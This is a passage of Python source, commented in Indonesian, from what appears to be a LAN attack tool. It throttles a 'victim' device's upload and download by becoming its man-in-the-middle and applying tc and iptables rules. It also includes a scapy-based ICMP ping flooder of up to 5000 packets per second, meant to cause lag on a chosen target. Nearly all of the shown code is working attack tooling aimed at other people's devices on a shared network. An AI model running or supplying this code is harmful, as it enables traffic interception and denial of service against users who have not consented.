        return get_if_addr(gw['iface'])
    except Exception:
        return None


def setup_qos_base(iface):
    """
    Siapkan struktur QoS dasar SEKALI saja (root qdisc htb + ingress + ifb0).
    Wajib dipanggil sebelum set_bandwidth_limit. Kalau sudah ada, aman dipanggil ulang.
    """
    # root htb di interface
    _run(['tc', 'qdisc', 'replace', 'dev', iface, 'root', 'handle', '1:', 'htb', 'default', '30'])
    _run(['tc', 'class', 'replace', 'dev', iface, 'parent', '1:', 'classid', '1:1',
          'htb', 'rate', '1000mbit'])
    _run(['tc', 'class', 'replace', 'dev', iface, 'parent', '1:1', 'classid', '1:30',
          'htb', 'rate', '1000mbit'])

    # ifb0 untuk upload (ingress redirect)
    _run(['modprobe', 'ifb'])
    _run(['ip', 'link', 'set', 'dev', 'ifb0', 'up'])
    _run(['tc', 'qdisc', 'replace', 'dev', iface, 'handle', 'ffff:', 'ingress'])
    _run(['tc', 'qdisc', 'replace', 'dev', 'ifb0', 'root', 'handle', '2:', 'htb', 'default', '30'])
    _run(['tc', 'class', 'replace', 'dev', 'ifb0', 'parent', '2:', 'classid', '2:1',
          'htb', 'rate', '1000mbit'])
    _run(['tc', 'class', 'replace', 'dev', 'ifb0', 'parent', '2:', 'classid', '2:30',
          'htb', 'rate', '1000mbit'])


def teardown_qos(iface):
    """Hapus SELURUH struktur QoS di interface (dipakai saat resume-all)."""
    _run(['tc', 'qdisc', 'del', 'dev', iface, 'root'])
    _run(['tc', 'qdisc', 'del', 'dev', iface, 'ingress'])
    _run(['tc', 'qdisc', 'del', 'dev', 'ifb0', 'root'])
    try:
        # IPv4
        sp.Popen(['iptables', '-t', 'mangle', '-F', 'POSTROUTING'],
                 stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        sp.Popen(['iptables', '-t', 'mangle', '-F', 'PREROUTING'],
                 stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        # IPv6
        sp.Popen(['ip6tables', '-t', 'mangle', '-F', 'POSTROUTING'],
                 stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        sp.Popen(['ip6tables', '-t', 'mangle', '-F', 'PREROUTING'],
                 stdout=sp.DEVNULL, stderr=sp.DEVNULL)
    except Exception:
        pass


def _mark_for(ip, base):
    """
    Bangkitkan mark DETERMINISTIK dari IP (bukan hash() python yang acak
    tiap proses). Range: base + 0..990, kelipatan 10.
    """
    import zlib
    h = zlib.crc32(ip.encode('utf-8')) % 100
    return base + h * 10


def set_bandwidth_limit(victim, iface=None, upload_kbit=0, download_kbit=0, setup_base=True):
    """
    Batasi bandwidth untuk `victim`.
      upload_kbit   : batas unggah target  (kbit/detik)
      download_kbit : batas unduh  target  (kbit/detik)
    Nilai 0 = tidak ada batas untuk arah tsb.
    Mengembalikan (ok, message).
    """
    victim_ip = victim['ip']
    if iface is None:
        iface = get_default_gw().get('iface', 'wlan0')

    # QoS butuh ip_forward + MITM sysctl supaya kita benar-benar
    # jadi jalur (MITM) untuk victim
    setup_mitm(iface)

    try:
        # siapkan struktur dasar kalau diminta (untuk pemakaian massal,
        # panggil setup_qos_base() SEKALI lalu set setup_base=False)
        if setup_base:
            setup_qos_base(iface)

        def _burst(kbit):
            # burst proporsional ~30 ms trafik supaya rata & tidak melebihi
            # batas. Nilai terlalu kecil (2k) -> tersendat/naik-turun.
            # Nilai terlalu besar -> overshoot tinggi di awal (speedtest
            # sempat lihat 1.5-2 Mbps). 30k = pas untuk rate <= 100 Mbit.
            b = int(kbit * 6 / 1000)             # ~30k untuk 5Mbit dst.
            b = min(max(b, 16), 128)             # clamp 16k..128k
            # quantum kecil untuk rate kecil -> pembagian antar-koneksi lebih
            # merata (mencegah 1 koneksi "binge" -> hasil speedtest naik-turun).
            q = 1500 if kbit >= 10000 else 600
            return ['burst', '%dk' % b, 'cburst', '%dk' % b, 'quantum', str(q)]
        # ----- DOWNLOAD target (kita -> target) : egress wlan0 -----
        if download_kbit and download_kbit > 0:
            dmark = _mark_for(victim_ip, 10)

            cmd = ['tc', 'class', 'replace', 'dev', iface, 'parent', '1:1',
                   'classid', '1:%d' % dmark,
                   'htb', 'rate', '%dkbit' % download_kbit,
                   'ceil', '%dkbit' % download_kbit] + _burst(download_kbit)
            _run(cmd)
            # leaf fq_codel agar stabil (handle unik per class)
            _run(['tc', 'qdisc', 'replace', 'dev', iface, 'parent', '1:%d' % dmark,
                  'handle', '%d:' % (200 + dmark), 'fq_codel'])

            # Mark di mangle (dipakai fallback/kompat) — IP-based filter
            # di bawah yang benar-benar mengarahkan paket.
            _run(['iptables', '-t', 'mangle', '-D', 'POSTROUTING', '-d', victim_ip,
                  '-j', 'MARK', '--set-mark', str(dmark)])
            _run(['iptables', '-t', 'mangle', '-A', 'POSTROUTING', '-d', victim_ip,
                  '-j', 'MARK', '--set-mark', str(dmark)])

            # PENTING: pakai u32 match 'ip dst <victim>' untuk mengarahkan
            # paket forwarded ke class limit. Filter 'fw' (berbasis mark)
            # TIDAK reliably bekerja untuk paket yang di-forward keluar
            # lewat interface yang sama (hairpin wlan0->wlan0): mark di-set
            # di POSTROUTING tapi filter egress tak melihatnya, sehingga
            # speedtest tetap tembus 34 Mbps. u32 match IP melihat isi paket
            # langsung -> selalu benar.
            dpref = 4000 + (_mark_for(victim_ip, 0) // 10)  # pref unik per IP
            _run(['tc', 'filter', 'del', 'dev', iface, 'parent', '1:',
                  'pref', str(dpref)])
            _run(['tc', 'filter', 'add', 'dev', iface, 'parent', '1:',
                  'protocol', 'ip', 'pref', str(dpref), 'u32',
                  'match', 'ip', 'dst', victim_ip + '/32',
                  'flowid', '1:%d' % dmark])

        # ----- UPLOAD target (target -> kita) via IFB -----
        if upload_kbit and upload_kbit > 0:
            umark = _mark_for(victim_ip, 2000)
            pref = 1 + (_mark_for(victim_ip, 0) // 10)  # 1..100 unik per IP

            # 1. buat class di ifb0 untuk host ini (hard cap)
            cmd = ['tc', 'class', 'replace', 'dev', 'ifb0', 'parent', '2:1',
                   'classid', '2:%d' % umark,
                   'htb', 'rate', '%dkbit' % upload_kbit,
                   'ceil', '%dkbit' % upload_kbit] + _burst(upload_kbit)
            _run(cmd)
            # leaf fq_codel untuk stabilitas
            _run(['tc', 'qdisc', 'replace', 'dev', 'ifb0', 'parent', '2:%d' % umark,
                  'handle', '%d:' % (300 + (umark % 1000)), 'fq_codel'])

            # 2. redirect paket dari target ke ifb0 (berbasis IP sumber),
            #    sekaligus SET kelas tujuan via 'flowid' supaya langsung
            #    masuk class yang benar tanpa bergantung pada mark.
            _run(['tc', 'filter', 'del', 'dev', iface, 'parent', 'ffff:',
                  'pref', str(pref)])
            _run(['tc', 'filter', 'add', 'dev', iface, 'parent', 'ffff:',
                  'protocol', 'ip', 'pref', str(pref), 'u32',
                  'match', 'ip', 'src', victim_ip + '/32',
                  'action', 'mirred', 'egress', 'redirect', 'dev', 'ifb0'])

            # 3. di ifb0: arahkan paket dari target ke class limit (by IP)
            ipref2 = 1000 + pref
            _run(['tc', 'filter', 'del', 'dev', 'ifb0', 'parent', '2:',
                  'pref', str(ipref2)])
            _run(['tc', 'filter', 'add', 'dev', 'ifb0', 'parent', '2:',
                  'protocol', 'ip', 'pref', str(ipref2), 'u32',
                  'match', 'ip', 'dst', victim_ip + '/32',
                  'flowid', '2:%d' % umark])
            # juga match src (arah balik) supaya tetap di class yang sama
            _run(['tc', 'filter', 'add', 'dev', 'ifb0', 'parent', '2:',
                  'protocol', 'ip', 'pref', str(ipref2 + 1), 'u32',
                  'match', 'ip', 'src', victim_ip + '/32',
                  'flowid', '2:%d' % umark])

        # ----- IPv6 (download & upload) -----
        # Identifikasi target lewat MAC (alamat IPv6 target tidak diketahui
        # pasti / bisa banyak). Pakai kelas terpisah supaya tidak bentrok.
        victim_mac = (victim.get('mac') or '').lower()
        if victim_mac and (download_kbit > 0 or upload_kbit > 0):
            dmark6 = _mark_for('6' + victim_ip, 10)
            umark6 = _mark_for('6' + victim_ip, 2000)

            if download_kbit and download_kbit > 0:
                # class download IPv6
                _run(['tc', 'class', 'replace', 'dev', iface, 'parent', '1:1',
                      'classid', '1:%d' % dmark6, 'htb',
                      'rate', '%dkbit' % download_kbit,
                      'ceil', '%dkbit' % download_kbit] + _burst(download_kbit))
                _run(['tc', 'qdisc', 'replace', 'dev', iface, 'parent', '1:%d' % dmark6,
                      'handle', '%d:' % (200 + (dmark6 % 1000)), 'fq_codel'])
                # arahkan paket IPv6 menuju MAC target ke class limit.
                # (pakai u32 match ether dst - iptables -m mac tidak bisa di POSTROUTING)
                _run(['tc', 'filter', 'replace', 'dev', iface, 'parent', '1:',
                      'protocol', 'ipv6', 'handle', str(dmark6), 'fw',
                      'flowid', '1:%d' % dmark6])
                dpref6 = 3000 + (_mark_for('6' + victim_ip, 0) // 10)
                _run(['tc', 'filter', 'del', 'dev', iface, 'parent', '1:',
                      'pref', str(dpref6)])
                _run(['tc', 'filter', 'add', 'dev', iface, 'parent', '1:',
                      'protocol', 'ipv6', 'pref', str(dpref6), 'u32',
                      'match', 'ether', 'dst', victim_mac,
                      'flowid', '1:%d' % dmark6])

            if upload_kbit and upload_kbit > 0:
                # class upload IPv6 di ifb0
                _run(['tc', 'class', 'replace', 'dev', 'ifb0', 'parent', '2:1',
                      'classid', '2:%d' % umark6, 'htb',
                      'rate', '%dkbit' % upload_kbit,
                      'ceil', '%dkbit' % upload_kbit] + _burst(upload_kbit))
                _run(['tc', 'qdisc', 'replace', 'dev', 'ifb0', 'parent', '2:%d' % umark6,
                      'handle', '%d:' % (300 + (umark6 % 1000)), 'fq_codel'])

                # redirect paket IPv6 DARI MAC target ke ifb0 (ingress, by MAC)
                pref6 = 500 + (_mark_for('6' + victim_ip, 0) // 10)
                _run(['tc', 'filter', 'del', 'dev', iface, 'parent', 'ffff:',
                      'pref', str(pref6)])
                _run(['tc', 'filter', 'add', 'dev', iface, 'parent', 'ffff:',
                      'protocol', 'ipv6', 'pref', str(pref6), 'u32',
                      'match', 'ether', 'src', victim_mac,
                      'action', 'mirred', 'egress', 'redirect', 'dev', 'ifb0'])

                # di ifb0: arahkan paket IPv6 target ke class limit (by MAC)
                ipref6 = 5000 + pref6
                _run(['tc', 'filter', 'del', 'dev', 'ifb0', 'parent', '2:',
                      'pref', str(ipref6)])
                _run(['tc', 'filter', 'add', 'dev', 'ifb0', 'parent', '2:',
                      'protocol', 'ipv6', 'pref', str(ipref6), 'u32',
                      'match', 'ether', 'src', victim_mac,
                      'flowid', '2:%d' % umark6])

        logger.info('Bandwidth limit set for {}: up={}kbit down={}kbit'.format(
            victim_ip, upload_kbit, download_kbit))
        return True, 'Limit set (up={} kbit/s, down={} kbit/s)'.format(upload_kbit, download_kbit)

    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return False, str(sys.exc_info()[1])


def unset_bandwidth_limit(victim, iface=None):
    """
    Hapus semua batas bandwidth untuk `victim`.
    """
    victim_ip = victim['ip']
    if iface is None:
        iface = get_default_gw().get('iface', 'wlan0')

    try:
        # hapus qdisc/filter kita di wlan0
        _run(['tc', 'qdisc', 'del', 'dev', iface, 'root'])
        _run(['tc', 'qdisc', 'del', 'dev', iface, 'ingress'])
        # hapus di ifb0
        _run(['tc', 'qdisc', 'del', 'dev', 'ifb0', 'root'])
        # hapus marking IPv4 (pakai nilai mark persis + retry, supaya
        # rule benar-benar terhapus — versi lama tanpa --set-mark
        # meninggalkan rule tertinggal).
        dmark = _mark_for(victim_ip, 10)
        umark = _mark_for(victim_ip, 2000)
        for _ in range(5):
            rc, _, _ = _run(['iptables', '-t', 'mangle', '-D', 'POSTROUTING',
                             '-d', victim_ip, '-j', 'MARK',
                             '--set-mark', str(dmark)])
            if rc != 0:
                break
        for _ in range(5):
            rc, _, _ = _run(['iptables', '-t', 'mangle', '-D', 'PREROUTING',
                             '-s', victim_ip, '-j', 'MARK',
                             '--set-mark', str(umark)])
            if rc != 0:
                break
        # fallback: hapus tanpa nilai mark (kalau versi lama terpasang)
        _run(['iptables', '-t', 'mangle', '-D', 'POSTROUTING', '-d', victim_ip,
              '-j', 'MARK'])
        _run(['iptables', '-t', 'mangle', '-D', 'PREROUTING', '-s', victim_ip,
              '-j', 'MARK'])
        # hapus marking IPv6 (berbasis MAC)
        victim_mac = (victim.get('mac') or '').lower()
        if victim_mac:
            dmark6 = _mark_for('6' + victim_ip, 10)
            umark6 = _mark_for('6' + victim_ip, 2000)
            _run(['ip6tables', '-t', 'mangle', '-D', 'POSTROUTING',
                  '-m', 'mac', '--dst-mac', victim_mac,
                  '-j', 'MARK', '--set-mark', str(dmark6)])
            _run(['ip6tables', '-t', 'mangle', '-D', 'PREROUTING',
                  '-m', 'mac', '--src-mac', victim_mac,
                  '-j', 'MARK', '--set-mark', str(umark6)])
        logger.info('Bandwidth limit removed for {}'.format(victim_ip))
        return True, 'Limit removed'
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return False, str(sys.exc_info()[1])


# ---------------------------------------------------------------------
#  PING FLOODER
# ---------------------------------------------------------------------
# Membanjiri target dengan ICMP echo request berkecepatan tinggi supaya
# latensi jaringan target naik (mis. 20ms -> 200ms) — efek "lag".
# Independen dari ARP spoof/cut/limit: tidak menyentuh victims list.
#
# Batas aman: hz dibatasi 1..5000 pps, size 8..1400 byte. Gateway dan
# perangkat sendiri TIDAK boleh di-flood (dicek di layer endpoint).
import threading as _threading

_FLOODS = {}   # {ip: {'stop': Event, 'thread': Thread, 'sent': int,
               #        'hz': int, 'size': int, 'start': float}}
_FLOOD_LOCK = _threading.RLock()

_FLOOD_MAX_HZ = 5000
_FLOOD_MIN_HZ = 1
_FLOOD_MAX_SIZE = 1400
_FLOOD_MIN_SIZE = 8


def _resolve_mac(ip, iface):
    """Cari MAC target dari ARP table; kirim 1 ARP kalau belum ada."""
    try:
        for _tgt, mac in read_arp_table().items():
            if _tgt == ip:
                return mac
    except Exception:
        pass
    # paksa resolusi via ping singkat
    try:
        sp.Popen(['ping', '-c', '1', '-W', '1', ip],
                 stdout=sp.DEVNULL, stderr=sp.DEVNULL).wait(timeout=2)
    except Exception:
        pass
    try:
        for _tgt, mac in read_arp_table().items():
            if _tgt == ip:
                return mac
    except Exception:
        pass
    return None


def _flood_loop(ip, hz, size, stop_evt, state):
    """
    Loop pengirim ICMP echo request (thread daemon).

    PENTING: pakai sendp() (layer 2, Ether framing) BUKAN send().
    send() melakukan route-lookup + ARP resolve tiap paket → hanya ~70 pps,
    tidak cukup untuk membuat lag.  sendp() dengan MAC target langsung
    bisa >2500 pps (35x lebih cepat).
    """
    iface = get_default_gw().get('iface', 'wlan0')
    try:
        my_mac = get_if_hwaddr(iface)
    except Exception:
        my_mac = None

    dst_mac = _resolve_mac(ip, iface)
    if not dst_mac or not my_mac:
        logger.error('flood: tidak bisa resolve MAC {} '.format(ip))
        state['sent'] = state.get('sent', 0)
        stop_evt.set()
        return

    payload = b'N' * max(size - 8, 0)      # ICMP header 8 byte
    frame = (Ether(src=my_mac, dst=dst_mac) /
             IP(dst=ip) / ICMP(type=8) / payload)

    # Kirim dalam CHUNK supaya bisa cek stop_evt secara berkala & pacing
    chunk = max(1, min(hz // 20, 200))     # ~50ms worth per iterasi
    interval = chunk / float(hz)           # detik per chunk

    while not stop_evt.is_set():
        try:
            sendp(frame, iface=iface, count=chunk, inter=0, verbose=0)
            state['sent'] += chunk
        except Exception:
            pass
        sleep_for = interval - 0.0
        if sleep_for > 0:
            time.sleep(sleep_for)
        else:
            time.sleep(0)


def ping_flood_start(ip, hz=200, size=56):
    """
    Mulai flood ICMP ke `ip`. Mengembalikan (ok, msg).
    Idempoten: kalau sudah jalan, perbarui hz/size saja.
    """
    if not ip:
        return False, 'ip required'
    try:
        hz = int(hz)
        size = int(size)
    except (ValueError, TypeError):
        return False, 'hz/size tidak valid'
    hz = min(max(hz, _FLOOD_MIN_HZ), _FLOOD_MAX_HZ)
    size = min(max(size, _FLOOD_MIN_SIZE), _FLOOD_MAX_SIZE)

    with _FLOOD_LOCK:
        old = _FLOODS.get(ip)
        if old and not old['stop'].is_set():
            # sudah jalan -> hentikan lalu mulai ulang dengan parameter baru
            old['stop'].set()
        stop_evt = _threading.Event()
        state = {'stop': stop_evt, 'thread': None, 'sent': 0,
                 'hz': hz, 'size': size, 'start': time.time()}
        t = _threading.Thread(target=_flood_loop,
                              args=(ip, hz, size, stop_evt, state),
                              daemon=True)
        state['thread'] = t
        _FLOODS[ip] = state
        t.start()
    logger.info('Ping flood start {} ({} pps, {} B)'.format(ip, hz, size))
    return True, 'Flood {} pps, {} B'.format(hz, size)


def ping_flood_stop(ip):
    """Hentikan flood ke `ip`. Mengembalikan (ok, msg)."""
    with _FLOOD_LOCK:
        st = _FLOODS.pop(ip, None)
    if st:
        st['stop'].set()
        logger.info('Ping flood stop {} (terkirim {})'.format(ip, st['sent']))
        return True, 'Flood stopped'
    return False, 'tidak sedang flood'


def ping_flood_stop_all():
    """Hentikan SEMUA flood. Mengembalikan daftar IP yang dihentikan."""
    with _FLOOD_LOCK:
        ips = list(_FLOODS.keys())
        states = [(_FLOODS.pop(k)) for k in ips]
    for st in states:
        st['stop'].set()
    if ips:
        logger.info('Ping flood stop-all: {}'.format(ips))
    return ips


def ping_flood_status():
    """
    Status semua flood aktif: {ip: {'sent','hz','size','elapsed'}}.
    Bersihkan yang thread-nya sudah berhenti.
    """
    out = {}
    with _FLOOD_LOCK:
        for ip, st in list(_FLOODS.items()):
            if st['stop'].is_set():
                _FLOODS.pop(ip, None)
                continue
            out[ip] = {
                'sent': st['sent'],
                'hz': st['hz'],
                'size': st['size'],
                'elapsed': round(time.time() - st['start'], 1),
            }
    return out


def ping_flood_active_ips():
    return list(ping_flood_status().keys())
